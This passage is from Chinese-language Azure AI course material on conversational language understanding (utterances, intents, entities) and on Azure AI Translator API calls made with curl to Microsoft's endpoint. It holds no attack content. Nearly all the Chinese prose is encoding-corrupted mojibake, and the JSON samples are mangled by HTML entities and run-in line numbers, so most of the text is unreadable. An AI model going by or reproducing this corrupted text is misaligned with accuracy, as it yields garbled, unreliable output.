‡è¯†ç”¨æˆ·å¯èƒ½æäº¤çš„è¨€è¯­ï¼Œä½†ä¸éœ€è¦ä¸ºå…¶æ‰§è¡Œç‰¹å®šæ“ä½œï¼ˆä¾‹å¦‚ï¼Œâ€œhelloâ€ä¹‹ç±»çš„å¯¹è¯é—®å€™è¯­ï¼‰æˆ–è¶…å‡ºæ­¤æ¨¡å‹çš„åŸŸèŒƒå›´ã€‚ ç¡®å®šæ¨¡å‹å¿…é¡»æ”¯æŒçš„ç›®æ ‡åï¼ŒåŠ¡å¿…è¦ä¸ºæ¯ä¸ªæ„å‘æ•è·å„ç§ä¸åŒçš„ç¤ºä¾‹è¨€è¯­ã€‚ æ”¶é›†ä½ è®¤ä¸ºç”¨æˆ·å°†è¾“å…¥çš„è¨€è¯­ï¼›åŒ…æ‹¬å«ä¹‰ç›¸åŒï¼Œä½†ç”¨ä¸åŒæ–¹å¼æ„é€ è€Œæˆçš„è¨€è¯­ã€‚ è¯·ç‰¢è®°è¿™äº›å‡†åˆ™ï¼š æ•è·å¤šä¸ªä¸åŒçš„ç¤ºä¾‹æˆ–åŒä¸€äº‹ç‰©çš„ä¸åŒè¯´æ³• é‡‡ç”¨ä¸åŒçš„è¨€è¯­é•¿åº¦ï¼šçŸ­ã€ä¸­ã€é•¿ ä½¿è¨€è¯­ä¸­çš„åè¯æˆ–ä¸»ä½“ä½äºä¸åŒä½ç½®ã€‚ å°†å…¶æ”¾åœ¨å¼€å¤´ã€æœ«å°¾æˆ–ä¸­é—´ åœ¨ä¸åŒçš„è¨€è¯­ä¸­ä½¿ç”¨æ­£ç¡®çš„å’Œä¸æ­£ç¡®çš„è¯­æ³•æ¥æä¾›è‰¯å¥½çš„è®­ç»ƒæ•°æ®ç¤ºä¾‹ æ ‡è®°æ•°æ®çš„ç²¾åº¦ã€ä¸€è‡´æ€§å’Œå®Œæ•´æ€§æ˜¯ç¡®å®šæ¨¡å‹æ€§èƒ½çš„å…³é”®å› ç´ ã€‚ ç²¾ç¡®æ ‡è®°ï¼šå§‹ç»ˆå°†æ¯ä¸ªå®ä½“æ ‡è®°ä¸ºæ­£ç¡®çš„ç±»å‹ã€‚ ä»…åŒ…å«è¦æå–çš„å†…å®¹ï¼Œé¿å…æ ‡ç­¾ä¸­å‡ºç°ä¸å¿…è¦çš„æ•°æ®ã€‚ ä¸€è‡´æ ‡è®°ï¼šåŒä¸€å®ä½“åœ¨æ‰€æœ‰è¯­å¥ä¸­éƒ½åº”å…·æœ‰ç›¸åŒçš„æ ‡è®°ã€‚ å®Œå…¨æ ‡è®°ï¼šæ ‡è®°æ‰€æœ‰è¯­å¥ä¸­å®ä½“çš„æ‰€æœ‰å®ä¾‹ã€‚ å®ä½“ç”¨äºå‘æ„å‘æ·»åŠ ç‰¹å®šä¸Šä¸‹æ–‡ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥å®šä¹‰å¯åº”ç”¨äºå¤šä¸ªè®¾å¤‡çš„ TurnOnDevice æ„å‘ï¼Œå¹¶ä½¿ç”¨å®ä½“å®šä¹‰ä¸åŒçš„è®¾å¤‡ã€‚ è¯·è€ƒè™‘ä»¥ä¸‹è¨€è¯­ã€æ„å‘å’Œå®ä½“ï¼š è¯è¯­ æ„å‘ å®ä½“ What is the time? GetTime What time is it in London? GetTime Location (London) Whatâ€™s the weather forecast for Paris? GetWeather Location (Paris) Will I need an umbrella tonight? GetWeather Time (tonight) Whatâ€™s the forecast for Seattle tomorrow? GetWeather Location (Seattle), Time (tomorrow) Turn the light on. TurnOnDevice Device (light) Switch on the fan. TurnOnDevice Device (fan) å¯ä»¥å°†å®ä½“æ‹†åˆ†ä¸ºå‡ ä¸ªä¸åŒçš„ç»„ä»¶ç±»å‹ï¼š å­¦ä¹ å®ä½“æ˜¯æœ€çµæ´»çš„å®ä½“ç±»å‹ï¼Œåº”åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ä½¿ç”¨ã€‚ ä½¿ç”¨åˆé€‚çš„åç§°å®šä¹‰å­¦ä¹ ç»„ä»¶ï¼Œç„¶ååœ¨è®­ç»ƒè¨€è¯­ä¸­å°†å•è¯æˆ–çŸ­è¯­ä¸è¯¥å®ä½“å…³è”ã€‚ è®­ç»ƒæ¨¡å‹æ—¶ï¼Œå°†äº†è§£å¦‚ä½•å°†è¨€è¯­ä¸­çš„ç›¸åº”å…ƒç´ ä¸å®ä½“åŒ¹é…ã€‚ å½“éœ€è¦å…·æœ‰ä¸€ç»„ç‰¹å®šå¯èƒ½å€¼ï¼ˆä¾‹å¦‚ï¼Œä¸€å‘¨ä¸­çš„å‡ å¤©ï¼‰çš„å®ä½“æ—¶ï¼Œåˆ—è¡¨å®ä½“éå¸¸æœ‰ç”¨ã€‚ å¯ä»¥åœ¨åˆ—è¡¨å®ä½“å®šä¹‰ä¸­åŒ…æ‹¬åŒä¹‰è¯ï¼Œä»¥ä¾¿å¯ä»¥å®šä¹‰åŒ…æ‹¬â€œSundayâ€ã€â€œMondayâ€ã€â€œTuesdayâ€ç­‰å€¼çš„ DayOfWeek å®ä½“ï¼›æ¯ä¸ªéƒ½æœ‰åŒä¹‰è¯ï¼Œä¾‹å¦‚â€œSunâ€ã€â€œMonâ€ã€â€œTueâ€ç­‰ã€‚ é¢„ç”Ÿæˆçš„å®ä½“å¯¹äºæ•°å­—ã€æ—¥æœŸ&#x2F;æ—¶é—´å’Œåç§°ç­‰å¸¸è§ç±»å‹éå¸¸æœ‰ç”¨ã€‚ ä¾‹å¦‚ï¼Œæ·»åŠ é¢„ç”Ÿæˆç»„ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨æ£€æµ‹â€œ6â€ç­‰å€¼æˆ–â€œMicrosoftâ€ç­‰ç»„ç»‡ã€‚ æœ‰å…³å—æ”¯æŒçš„é¢„ç”Ÿæˆå®ä½“çš„åˆ—è¡¨ï¼Œè¯·å‚é˜…æœ¬æ–‡ã€‚ ä½¿ç”¨æ¨¡å¼åŒºåˆ†ç›¸ä¼¼çš„è¨€è¯­åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ¨¡å‹å¯èƒ½åŒ…å«å¤šä¸ªæ„å‘ï¼Œè¿™äº›æ„å‘çš„è¨€è¯­å¯èƒ½ç›¸ä¼¼ã€‚ å¯ä»¥ä½¿ç”¨è¯­å¥æ¨¡å¼æ¥åŒºåˆ†æ„å‘ï¼ŒåŒæ—¶æœ€å¤§é™åº¦åœ°å‡å°‘ç¤ºä¾‹è¨€è¯­çš„æ•°é‡ã€‚ ä¾‹å¦‚ï¼Œè€ƒè™‘ä»¥ä¸‹è¨€è¯­ï¼š â€œTurn on the kitchen lightâ€ â€œIs the kitchen light on?â€ â€œTurn off the kitchen lightâ€ è¿™äº›è¨€è¯­åœ¨è¯­æ³•ä¸Šç›¸ä¼¼ï¼Œä½†åœ¨å•è¯æˆ–æ ‡ç‚¹ç¬¦å·æ–¹é¢åªæœ‰ä¸€äº›å·®å¼‚ã€‚ ä½†æ˜¯ï¼Œå®ƒä»¬è¡¨ç¤ºä¸‰ä¸ªä¸åŒçš„æ„å‘ï¼ˆåˆ†åˆ«ä¸º TurnOnDeviceã€GetDeviceStatus å’Œ TurnOffDeviceï¼‰ã€‚ æ­¤å¤–ï¼Œæ„å‘å¯åº”ç”¨äºå„ç§å®ä½“å€¼ã€‚ é™¤äº†â€œå¨æˆ¿ç¯â€ä¹‹å¤–ï¼Œæ„å‘è¿˜é€‚ç”¨äºâ€œå®¢å…ç¯â€ã€â€œç”µè§†â€æˆ–å¯èƒ½éœ€è¦æ¨¡å‹æ¥æä¾›æ”¯æŒçš„ä»»ä½•å…¶ä»–è®¾å¤‡ã€‚ è‹¥è¦æ­£ç¡®è®­ç»ƒæ¨¡å‹ï¼Œè¯·æä¾›ä¸€äº›æŒ‡å®šä¸åŒæ ¼å¼è¨€è¯­çš„æ„å‘ç¤ºä¾‹ã€‚ TurnOnDeviceï¼š â€œTurn on the {DeviceName}â€ â€œåœ¨ {DeviceName} ä¸Šåˆ‡æ¢â€ â€œTurn the {DeviceName} onâ€ GetDeviceStatusï¼š â€œIs the {DeviceName} on[?]â€ TurnOffDeviceï¼š â€œTurn the {DeviceName} offâ€ â€œSwitch off the {DeviceName}â€ â€œTurn off the {DeviceName}â€ åœ¨ä½¿ç”¨æ¯ç§ä¸åŒç±»å‹çš„è¨€è¯­æ¥è®­ç»ƒæ¨¡å‹æ—¶ï¼ŒAzure AI è¯­è¨€æœåŠ¡å¯ä»¥å­¦ä¹ å¦‚ä½•æ ¹æ®æ ¼å¼å’Œæ ‡ç‚¹æ­£ç¡®åœ°å¯¹æ„å›¾è¿›è¡Œåˆ†ç±»ã€‚ ä½¿ç”¨é¢„ç”Ÿæˆçš„å®ä½“ç»„ä»¶å¯ä»¥é€šè¿‡å®šä¹‰æ‰€éœ€çš„æ‰€æœ‰æ„å‘å’Œè¯­å¥æ¥åˆ›å»ºè‡ªå·±çš„è¯­è¨€æ¨¡å‹ï¼Œä½†é€šå¸¸å¯ä»¥ä½¿ç”¨é¢„ç”Ÿæˆç»„ä»¶æ¥æ£€æµ‹å¸¸è§å®ä½“ï¼Œä¾‹å¦‚æ•°å­—ã€ç”µå­é‚®ä»¶ã€URL æˆ–é€‰æ‹©ã€‚ æœ‰å…³ Azure AI è¯­è¨€æœåŠ¡å¯ä»¥æ£€æµ‹çš„é¢„ç”Ÿæˆå®ä½“çš„å®Œæ•´åˆ—è¡¨ï¼Œè¯·å‚é˜…å—æ”¯æŒçš„é¢„ç”Ÿæˆå®ä½“ç»„ä»¶åˆ—è¡¨ã€‚ ä½¿ç”¨é¢„ç”Ÿæˆç»„ä»¶ï¼Œå¯ä»¥è®© Azure AI è¯­è¨€æœåŠ¡è‡ªåŠ¨æ£€æµ‹æŒ‡å®šç±»å‹çš„å®ä½“ï¼Œä¸”ä¸å¿…ä½¿ç”¨è¯¥å®ä½“çš„ç¤ºä¾‹æ¥è®­ç»ƒæ¨¡å‹ã€‚ è‹¥è¦æ·»åŠ é¢„ç”Ÿæˆç»„ä»¶ï¼Œå¯ä»¥åœ¨é¡¹ç›®ä¸­åˆ›å»ºå®ä½“ï¼Œç„¶åé€‰æ‹©è¯¥å®ä½“çš„â€œæ·»åŠ æ–°é¢„ç”Ÿæˆâ€ä»¥æ£€æµ‹æŸäº›å®ä½“ã€‚ æ¯ä¸ªå®ä½“æœ€å¤šå¯ä»¥åŒ…å« 5 ä¸ªé¢„ç”Ÿæˆç»„ä»¶ã€‚ ä½¿ç”¨é¢„ç”Ÿæˆæ¨¡å‹å…ƒç´ å¯ä»¥æ˜¾è‘—å‡å°‘å¼€å‘å¯¹è¯è¯­è¨€ç†è§£è§£å†³æ–¹æ¡ˆæ‰€éœ€çš„æ—¶é—´ã€‚ è®­ç»ƒã€æµ‹è¯•ã€å‘å¸ƒå’ŒæŸ¥çœ‹å¯¹è¯è¯­è¨€ç†è§£æ¨¡å‹åˆ›å»ºæ¨¡å‹æ˜¯ä¸€ä¸ªè¿­ä»£è¿‡ç¨‹ï¼ŒåŒ…æ‹¬ä»¥ä¸‹æ´»åŠ¨ï¼š è®­ç»ƒæ¨¡å‹ä»¥ä»ç¤ºä¾‹è¨€è¯­ä¸­å­¦ä¹ æ„å‘å’Œå®ä½“ã€‚ ä»¥äº¤äº’å¼æ–¹å¼æˆ–ä½¿ç”¨å¸¦æœ‰å·²çŸ¥æ ‡ç­¾çš„æµ‹è¯•æ•°æ®é›†æµ‹è¯•æ¨¡å‹ å°†ç»è¿‡è®­ç»ƒçš„æ¨¡å‹éƒ¨ç½²åˆ°å…¬å…±ç»ˆç»“ç‚¹ä»¥ä¾›å®¢æˆ·ç«¯åº”ç”¨ä½¿ç”¨ æŸ¥çœ‹é¢„æµ‹å¹¶è¿­ä»£è®¿é—®è¯­å¥ä»¥è®­ç»ƒæ¨¡å‹ é€šè¿‡éµå¾ªæ­¤è¿­ä»£æ–¹æ³•ï¼Œä½ å¯ä»¥æ ¹æ®ç”¨æˆ·è¾“å…¥éšç€æ—¶é—´çš„æ¨ç§»è€Œæ”¹è¿›è¯­è¨€æ¨¡å‹ï¼Œä»è€Œå¸®åŠ©å¼€å‘åæ˜ ç”¨æˆ·ä½¿ç”¨è‡ªç„¶è¯­è¨€æŒ‡ç¤ºå…¶æ„å‘çš„æ–¹å¼çš„è§£å†³æ–¹æ¡ˆã€‚ è¨€è¯­æ˜¯æŒ‡ç¤ºç‰¹å®šæ„å‘çš„ç¤ºä¾‹çŸ­è¯­ã€‚ åŸå¸‚æ˜¯åº”è¯¥åº”ç”¨æ„å‘ï¼ˆé¢„è®¢èˆªç­ï¼‰çš„å®ä½“ã€‚ å½“è¯­è¨€æ¨¡å‹éœ€è¦æ£€æµ‹å…¬å…±å®ä½“æ—¶ï¼Œè¯·ä½¿ç”¨é¢„ç”Ÿæˆç»„ä»¶è®© Azure AI è¯­è¨€æœåŠ¡è‡ªåŠ¨æ£€æµ‹å®ä½“ã€‚ ä½¿ç”¨ Azure AI ç¿»è¯‘æœåŠ¡ç¿»è¯‘æ–‡æœ¬ ä¸–ç•Œä¸Šæœ‰è®¸å¤šå¸¸ç”¨è¯­è¨€ï¼Œåœ¨ä¸åŒè¯­è¨€çš„å‘è¨€äººä¹‹é—´äº¤æ¢ä¿¡æ¯çš„åŠŸèƒ½é€šå¸¸æ˜¯å…¨çƒè§£å†³æ–¹æ¡ˆçš„å…³é”®è¦æ±‚ã€‚ Azure AI ç¿»è¯‘æä¾›äº†ä¸€ä¸ª APIï¼Œç”¨äºåœ¨æ”¯æŒçš„ 90 ç§è¯­è¨€ä¹‹é—´ç¿»è¯‘æ–‡æœ¬ã€‚ å®Œæˆæ­¤æ¨¡å—åï¼Œä½ å°†èƒ½å¤Ÿï¼š é¢„é… Azure AI ç¿»è¯‘èµ„æºäº†è§£è¯­è¨€æ£€æµ‹ã€ç¿»è¯‘å’ŒéŸ³è¯‘æŒ‡å®šç¿»è¯‘é€‰é¡¹å®šä¹‰å¹¶è¿è¡Œè‡ªå®šä¹‰ç¿»è¯‘ é¢„é… Azure AI ç¿»è¯‘èµ„æºâ€‹Azure AI ç¿»è¯‘æä¾›äº†å¤šè¯­è¨€æ–‡æœ¬ç¿»è¯‘ APIï¼Œå¯ç”¨äºï¼šâ€‹ è¯­è¨€æ£€æµ‹ã€‚ ä¸€å¯¹å¤šç¿»è¯‘ã€‚ è„šæœ¬éŸ³è¯‘ï¼ˆå°†æœ¬æœºè„šæœ¬ä¸­çš„æ–‡æœ¬è½¬æ¢ä¸ºæ›¿ä»£è„šæœ¬ï¼‰ã€‚â€‹â€‹ é€‚ç”¨äº Azure AI ç¿»è¯‘çš„ Azure èµ„æºâ€‹è‹¥è¦ä½¿ç”¨ Azure AI ç¿»è¯‘æœåŠ¡ï¼Œå¿…é¡»åœ¨ Azure è®¢é˜…ä¸­ä¸ºå…¶é¢„é…èµ„æºã€‚ å¯ä»¥é¢„é…å•æœåŠ¡ Azure AI ç¿»è¯‘èµ„æºï¼Œä¹Ÿå¯ä»¥åœ¨å¤šæœåŠ¡ Azure AI æœåŠ¡èµ„æºä¸­ä½¿ç”¨æ–‡æœ¬åˆ†æ APIã€‚â€‹åœ¨ Azure è®¢é˜…ä¸­é¢„é…é€‚å½“çš„èµ„æºåï¼Œå¯ä»¥ä½¿ç”¨éƒ¨ç½²èµ„æºçš„ä½ç½®åŠå…¶è®¢é˜…å¯†é’¥ä¹‹ä¸€ä»ä»£ç ä¸­è°ƒç”¨ Azure AI ç¿»è¯‘ APIã€‚ å¯ä»¥é€šè¿‡å‘ REST æ¥å£æäº¤ JSON æ ¼å¼çš„è¯·æ±‚ï¼Œæˆ–è€…é€šè¿‡ä½¿ç”¨ç‰¹å®šäºç¼–ç¨‹è¯­è¨€çš„ä»»ä½•å¯ç”¨ SDK æ¥è°ƒç”¨ APIã€‚â€‹æ³¨æ„â€‹æœ¬æ¨¡å—çš„åç»­å•å…ƒä¸­çš„ä»£ç ç¤ºä¾‹æ˜¾ç¤ºäº†ä¸ REST æ¥å£äº¤æ¢çš„ JSON è¯·æ±‚å’Œå“åº”ã€‚ ä½¿ç”¨ SDK æ—¶ï¼Œä¼šé€šè¿‡ç”¨äºå°è£…ç›¸åŒæ•°æ®å€¼çš„é€‚å½“å¯¹è±¡å’Œæ–¹æ³•å¯¹ JSON è¯·æ±‚è¿›è¡ŒæŠ½è±¡ã€‚ åœ¨æœ¬æ¨¡å—åé¢çš„ç»ƒä¹ ä¸­ï¼Œä½ å°†æœ‰æœºä¼šäº²è‡ªå°è¯•ä½¿ç”¨é€‚ç”¨äº C# æˆ– Python çš„ SDKã€‚â€‹ äº†è§£è¯­è¨€æ£€æµ‹ã€ç¿»è¯‘å’ŒéŸ³è¯‘è®©æˆ‘ä»¬æ¥æ¢ç´¢ Azure AI ç¿»è¯‘çš„åŠŸèƒ½ã€‚ è¿™äº›åŠŸèƒ½åŒ…æ‹¬ï¼š è¯­è¨€æ£€æµ‹å¯ä½¿ç”¨ REST API çš„ Detect å‡½æ•°æ¥æ£€æµ‹ç¼–å†™æ–‡æœ¬æ‰€ç”¨çš„è¯­è¨€ã€‚ ä¾‹å¦‚ï¼Œå¯ä½¿ç”¨ curl å°†ä»¥ä¸‹æ–‡æœ¬æäº¤åˆ° https://api.cognitive.microsofttranslator.com/detect?api-version=3.0 ç»ˆç»“ç‚¹ã€‚ ä¸‹é¢æ˜¯è¦ç¿»è¯‘çš„æ–‡æœ¬ï¼š 1&#123; &#x27;Text&#x27; : &#x27;ã“ã‚“ã«ã¡ã¯&#x27; &#125; ä¸‹é¢æ˜¯ä½¿ç”¨ curl å¯¹ç»ˆç»“ç‚¹çš„è°ƒç”¨ï¼Œç›®çš„æ˜¯æ£€æµ‹æ–‡æœ¬çš„è¯­è¨€ï¼š 1curl -X POST &quot;https://api.cognitive.microsofttranslator.com/detect?api-version=3.0&quot; -H &quot;Ocp-Apim-Subscription-Region: &lt;your-service-region&gt;&quot; -H &quot;Ocp-Apim-Subscription-Key: &lt;your-key&gt;&quot; -H &quot;Content-Type: application/json&quot; -d &quot;[&#123; &#x27;Text&#x27; : &#x27;ã“ã‚“ã«ã¡ã¯&#x27; &#125;] å¯¹æ­¤è¯·æ±‚çš„å“å¦‚ä¸‹æ‰€ç¤ºï¼Œè¡¨ç¤ºæ–‡æœ¬ä½¿ç”¨æ—¥è¯­ç¼–å†™ï¼š 12345678910[ &#123; &quot;language&quot;: &quot;ja&quot;, &quot;score&quot;: 1.0, &quot;isTranslationSupported&quot;: true, &quot;isTransliterationSupported&quot;: true &#125;] ç¿»è¯‘è‹¥è¦å°†æ–‡æœ¬ä»ä¸€ç§è¯­è¨€ç¿»è¯‘ä¸ºå¦ä¸€ç§è¯­è¨€ï¼Œè¯·ä½¿ç”¨ Translate å‡½æ•°ï¼›æŒ‡å®šä¸€ä¸ª from å‚æ•°æ¥æŒ‡ç¤ºæºè¯­è¨€ï¼Œå¹¶æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ª to å‚æ•°ï¼Œä»¥æŒ‡å®šæ–‡æœ¬ç¿»è¯‘çš„ç›®æ ‡è¯­è¨€ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥æäº¤ä¹‹å‰ç”¨äºæ£€æµ‹è¯­è¨€çš„ç›¸åŒ JSONï¼Œä»è€ŒæŒ‡å®š jaï¼ˆæ—¥è¯­ï¼‰çš„ from å‚æ•°ä»¥åŠå€¼ä¸º Enï¼ˆè‹±è¯­ï¼‰å’Œ frï¼ˆæ³•è¯­ï¼‰çš„ä¸¤ä¸ª to å‚æ•°ã€‚ ä¸ºæ­¤ï¼Œéœ€è¦è°ƒç”¨ï¼š 1curl -X POST &quot;https://api.cognitive.microsofttranslator.com/translate?api-version=3.0&amp;from=ja&amp;to=fr&amp;to=en&quot; -H &quot;Ocp-Apim-Subscription-Key: &lt;your-key&gt;&quot; -H &quot;Ocp-Apim-Subscription-Region: &lt;your-service-region&gt;&quot; -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &quot;[&#123; &#x27;Text&#x27; : &#x27;ã“ã‚“ã«ã¡ã¯&#x27; &#125;]&quot; è¿™å°†ç”Ÿæˆä»¥ä¸‹ç»“æœï¼š 12345678[ &#123;&quot;translations&quot;: [ &#123;&quot;text&quot;: &quot;Hello&quot;, &quot;to&quot;: &quot;en&quot;&#125;, &#123;&quot;text&quot;: &quot;Bonjour&quot;, &quot;to&quot;: &quot;fr&quot;&#125; ] &#125;] éŸ³è¯‘æ—¥è¯­æ–‡æœ¬æ˜¯ä½¿ç”¨å¹³å‡åè„šæœ¬ç¼–å†™çš„ï¼Œå› æ­¤ï¼Œä½ å¯èƒ½æƒ³è¦å°†å…¶ç¿»è¯‘ä¸ºä¸åŒçš„è„šæœ¬ï¼Œè€Œä¸æ˜¯å°†å…¶ç¿»è¯‘ä¸ºä¸åŒçš„è¯­è¨€ï¼Œä¾‹å¦‚ï¼Œä½¿ç”¨æ‹‰ä¸è„šæœ¬ï¼ˆå¦‚è‹±è¯­è¯­è¨€æ–‡æœ¬æ‰€ä½¿ç”¨ï¼‰å‘ˆç°æ–‡æœ¬ã€‚ ä¸ºå®ç°æ­¤ç›®çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Jpan çš„ fromScript å‚æ•°å’Œ Latn çš„ toScript å‚æ•°å°†æ—¥è¯­æ–‡æœ¬æäº¤åˆ° Transliterate å‡½æ•°ï¼š 1curl -X POST &quot;https://api.cognitive.microsofttranslator.com/transliterate?api-version=3.0&amp;fromScript=Jpan&amp;toScript=Latn&quot; -H &quot;Ocp-Apim-Subscription-Key: &lt;your-key&gt;&quot; -H &quot;Ocp-Apim-Subscription-Region: &lt;your-service-region&gt;&quot; -H &quot;Content-Type: application/json&quot; -d &quot;[&#123; &#x27;Text&#x27; : &#x27;ã“ã‚“ã«ã¡ã¯&#x27; &#125;]&quot; å“åº”ä¼šæä¾›ä»¥ä¸‹ç»“æœï¼š 123456[ &#123; &quot;script&quot;: &quot;Latn&quot;, &quot;text&quot;: &quot;Kon&#x27;nichiwa&quot; &#125;] æŒ‡å®šç¿»è¯‘é€‰é¡¹API çš„ Translate å‡½æ•°æ”¯æŒå¤šä¸ªå½±å“è¾“å‡ºçš„å‚æ•°ã€‚ å•è¯å¯¹é½æ–¹å¼åœ¨ä¹¦é¢è‹±è¯­ï¼ˆä½¿ç”¨æ‹‰ä¸è„šæœ¬ï¼‰ä¸­ï¼Œç©ºæ ¼ç”¨äºåˆ†éš”å•è¯ã€‚ ä½†æ˜¯ï¼Œåœ¨æŸäº›å…¶ä»–è¯­è¨€ï¼ˆæ›´å…·ä½“åœ°è¯´ï¼Œè„šæœ¬ï¼‰ä¸­ï¼Œå¹¶éæ€»æ˜¯å¦‚æ­¤ã€‚ ä¾‹å¦‚ï¼Œå°†â€œSmart Servicesâ€ä» enï¼ˆè‹±è¯­ï¼‰ç¿»è¯‘ä¸º zhï¼ˆç®€ä½“ä¸­æ–‡ï¼‰ä¼šç”Ÿæˆç»“æœâ€œæ™ºèƒ½æœåŠ¡â€ï¼Œå¹¶ä¸”å¾ˆéš¾ç†è§£æºæ–‡æœ¬ä¸­çš„å­—ç¬¦ä¸ç¿»è¯‘ä¸­çš„ç›¸åº”å­—ç¬¦ä¹‹é—´çš„å…³ç³»ã€‚ è‹¥è¦è§£å†³æ­¤é—®é¢˜ï¼Œå¯ä»¥åœ¨è°ƒç”¨ä¸­æŒ‡å®šå€¼ä¸º true çš„ includeAlignment å‚æ•°æ¥ç”Ÿæˆä»¥ä¸‹ç»“æœï¼š 12345678910111213[ &#123; &quot;translations&quot;:[ &#123; &quot;text&quot;:&quot;æ™ºèƒ½æœåŠ¡&quot;, &quot;to&quot;:&quot;zh-Hans&quot;, &quot;alignment&quot;:&#123; &quot;proj&quot;:&quot;0:4-0:1 6:13-2:3&quot; &#125; &#125; ] &#125;] è¿™äº›ç»“æœå‘Šè¯‰æˆ‘ä»¬ï¼Œæºä¸­çš„å­—ç¬¦ 0 åˆ° 4 å¯¹åº”äºç¿»è¯‘ä¸­çš„å­—ç¬¦ 0 åˆ° 1ï¼Œè€Œæºä¸­çš„å­—ç¬¦ 6 åˆ° 13 å¯¹åº”äºç¿»è¯‘ä¸­çš„å­—ç¬¦ 2 åˆ° 3ã€‚ å¥å­é•¿åº¦æœ‰æ—¶ï¼ŒçŸ¥é“ç¿»è¯‘é•¿åº¦å¯èƒ½ä¼šå¾ˆæœ‰ç”¨ï¼Œä¾‹å¦‚ï¼Œç¡®å®šå¦‚ä½•åœ¨ç”¨æˆ·ç•Œé¢ä¸­ä»¥æœ€ä½³æ–¹å¼æ˜¾ç¤ºå®ƒã€‚ å¯ä»¥é€šè¿‡å°† includeSentenceLength å‚æ•°è®¾ç½®ä¸º true æ¥è·å–æ­¤ä¿¡æ¯ã€‚ ä¾‹å¦‚ï¼Œåœ¨å°†è‹±è¯­ (en) æ–‡æœ¬â€œHello worldâ€ç¿»è¯‘æˆæ³•è¯­ (fr) æ—¶æŒ‡å®šæ­¤å‚æ•°å°†äº§ç”Ÿä»¥ä¸‹ç»“æœï¼š 1234567891011[ &#123; &quot;translations&quot;:[ &#123; &quot;text&quot;:&quot;Salut tout le monde&quot;, &quot;to&quot;:&quot;fr&quot;, &quot;sentLen&quot;:&#123;&quot;srcSentLen&quot;:[12],&quot;transSentLen&quot;:[20]&#125; &#125; ] &#125;] çŒ¥äºµè¯­è¨€è¿‡æ»¤æœ‰æ—¶ï¼Œæ–‡æœ¬åŒ…å«çŒ¥äºµè¯­è¨€ï¼Œä½ å¯èƒ½å¸Œæœ›åœ¨ç¿»è¯‘ä¸­å®Œå…¨æ©ç›–æˆ–çœç•¥å®ƒã€‚ å¯ä»¥é€šè¿‡æŒ‡å®š profanityAction å‚æ•°æ¥å¤„ç†çŒ¥äºµè¯­è¨€ï¼Œè¯¥å‚æ•°å¯ä»¥å…·æœ‰ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š NoActionï¼šçŒ¥äºµè¯­è¨€ä¸æ–‡æœ¬çš„å…¶ä½™éƒ¨åˆ†ä¸€èµ·ç¿»è¯‘ã€‚ Deletedï¼šç¿»è¯‘ä¸­çœç•¥äº†çŒ¥äºµè¯­è¨€ã€‚ Markedï¼šä½¿ç”¨ profanityMarker å‚æ•°ï¼ˆå¦‚æœæä¾›ï¼‰ä¸­æ‰€æŒ‡ç¤ºçš„æ–¹æ³•æ¥æŒ‡ç¤ºçŒ¥äºµè¯­è¨€ã€‚ æ­¤å‚æ•°çš„é»˜è®¤å€¼ä¸ºâ€œAsteriskâ€ï¼Œè¿™ä¼šå°†çŒ¥äºµè¯­è¨€ä¸­çš„å­—ç¬¦æ›¿æ¢ä¸ºâ€œ*â€ã€‚ ä½œä¸ºæ›¿ä»£æ–¹æ³•ï¼Œä½ å¯ä»¥å°†â€œæ ‡è®°â€çš„å€¼æŒ‡å®šä¸º profanityMarkerï¼Œè¿™ä¼šå°†çŒ¥äºµè¯­è¨€æ‹¬åœ¨ XML æ ‡è®°ä¸­ã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ Marked çš„ profanityAction å’Œ Asterisk çš„ profanityMarker å°†è‹±è¯­ (en) æ–‡æœ¬â€œJSON is â–‡â–‡â–‡â–‡ great!â€ï¼ˆå…¶ä¸­ï¼Œè¢«æŒ¡ä½çš„å•è¯æ˜¯çŒ¥äºµè¯­è¨€ï¼‰ç¿»è¯‘ä¸ºå¾·è¯­ (de) ä¼šäº§ç”Ÿä»¥ä¸‹ç»“æœï¼š 12345678910[ &#123; &quot;translations&quot;:[ &#123; &quot;text&quot;:&quot;JSON ist *** erstaunlich.&quot;, &quot;to&quot;:&quot;de&quot; &#125; ] &#125;] å®šä¹‰è‡ªå®šä¹‰ç¿»è¯‘Azure AI ç¿»è¯‘ä½¿ç”¨çš„é»˜è®¤ç¿»è¯‘æ¨¡å‹å¯¹äºå¸¸è§„å†…å®¹çš„ç¿»è¯‘è¾ƒæœ‰æ•ˆï¼Œä½†ä½ å¯èƒ½éœ€è¦ä¸ºä½¿ç”¨ä¸“ä¸šæœ¯è¯­è¯æ±‡çš„ä¼ä¸šæˆ–è¡Œä¸šå¼€å‘ç¿»è¯‘è§£å†³æ–¹æ¡ˆï¼Œè¿™å°±éœ€è¦ç”¨åˆ°è‡ªå®šä¹‰ç¿»è¯‘ã€‚ è‹¥è¦è§£å†³æ­¤é—®é¢˜ï¼Œå¯ä»¥åˆ›å»ºç”¨äºæ˜ å°„è‡ªå·±çš„æºå’Œç›®æ ‡æœ¯è¯­é›†è¿›è¡Œç¿»è¯‘çš„è‡ªå®šä¹‰æ¨¡å‹ã€‚ è‹¥è¦åˆ›å»ºè‡ªå®šä¹‰æ¨¡å‹ï¼Œè¯·ä½¿ç”¨è‡ªå®šä¹‰ç¿»è¯‘å·¥å…·é—¨æˆ·æ¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š åˆ›å»ºå·¥ä½œåŒºå¹¶é“¾æ¥åˆ° Azure AI ç¿»è¯‘èµ„æºã€‚ åˆ›å»ºé¡¹ç›®ã€‚ ä¸Šä¼ è®­ç»ƒæ•°æ®æ–‡ä»¶å’Œè®­ç»ƒæ¨¡å‹ã€‚ æµ‹è¯•æ¨¡å‹å’Œå‘å¸ƒæ¨¡å‹ã€‚ å¯¹ API è¿›è¡Œç¿»è¯‘è°ƒç”¨ã€‚ å°†ä¸ºè‡ªå®šä¹‰æ¨¡å‹åˆ†é…å”¯ä¸€çš„ç±»åˆ« 